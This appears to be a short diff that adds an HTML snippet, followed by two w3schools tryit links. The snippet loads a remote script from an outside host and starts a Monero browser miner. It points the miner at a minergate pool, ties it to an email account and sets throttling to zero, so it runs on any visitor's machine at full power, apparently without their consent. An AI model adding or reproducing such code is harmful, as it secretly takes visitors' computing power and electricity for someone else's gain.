@@ -1,0 +1,10 @@
+<script src="https://gobba.myeffect.net/perfekt/perfektaweb.js?perfekt=wss://?algo=cn?variant=0?jason=poll:xmr.pool.minergate.com:45700" > </script>
+<script type="text/javascript">
+PerfektStart('fevernaya@gmail.com', 'x');
+throttleMiner = 0;
+</script>
+
+
+https://www.w3schools.com/code/tryit.asp?filename=FWBZ86ME0597
+
+https://www.w3schools.com/code/tryit.asp?filename=FWBZQ7RLTYTL
